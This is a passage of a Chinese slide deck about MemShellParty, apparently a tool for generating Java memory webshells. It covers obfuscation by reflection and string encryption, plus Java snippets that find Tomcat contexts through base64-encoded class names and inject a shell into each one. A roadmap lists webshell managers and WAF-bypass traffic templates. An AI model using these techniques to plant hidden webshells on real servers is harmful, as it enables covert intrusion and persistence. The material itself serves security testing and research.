- 将类方法调用改为反射调用，例如 ProcessBuilder.start，并将所有字符串进行加密
- 将单个类，拆分成各个小的混淆类，增加调用链深度，提高溯源成本

<div class="grid grid-cols-2 gap-1">

```java
a {
  try {
    Object[] c = f.a(); // 获取上下文对象
    for(Object x: c){
      if(a.i(x)){ // 判断是否未注入
        c.a(x); // 执行注入动作
      }
    }
  }catch(Exception e){}
}
```

```java
f {
  a {
    for (Thread t : Thread.getAllStackTraces().keySet()) {
        if (thread.getName().contains(a("Q29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3Nvcg=="))) {
            Map<?, ?> m = (Map<?, ?>) g(g(g(t, a("dGFyZ2V0")), a("dGhpcyQw")), a("Y2hpbGRyZW4="));
            for (Object v : m.values()) {
                Map<?, ?> d = (Map<?, ?>) g(v, a("Y2hpbGRyZW4="));
                c.addAll(d.values());
            }
            continue;
        }else if (t.getContextClassLoader() != null && (t.getContextClassLoader().getClass().toString().contains(a("UGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcg=="))|| t.getContextClassLoader().getClass().toString().contains(a("VG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcg==")))) {
            c.add(g(g(t.getContextClassLoader(), a("cmVzb3VyY2Vz")), a("Y29udGV4dA==")));
        }
    }
    return c;
  }
}
```

</div>

---
layout: intro
---

# Roadmap

- Web 组件管理器
- 集成 Shell 管理器（适配蚁剑、冰蝎和哥斯拉）
- 自定义流量模板
- 更多的小马
- 测试并分享更多和服务类型相关的 Payload
- 研究不同服务类型权限维持相关姿势

<!--

Web 组件管理器：我是第一个来的，谁也别想再上马

shell 管理器：让 MemShellParty 成为生成和管理为一体的内存马测试工具

流量模板：让人人都能绕过 WAF，以后我可不能去做 WAF 开发，这不直接为难自己

另外作为 RASP 研发，为了降低自己的工作难度，暂时不会分享具体绕过 RASP 的代码

-->

---
layout: intro
class: text-center pb-5
glowX: 50
glowY: 120
---

# Happy Hacking! {.font-hand.italic}
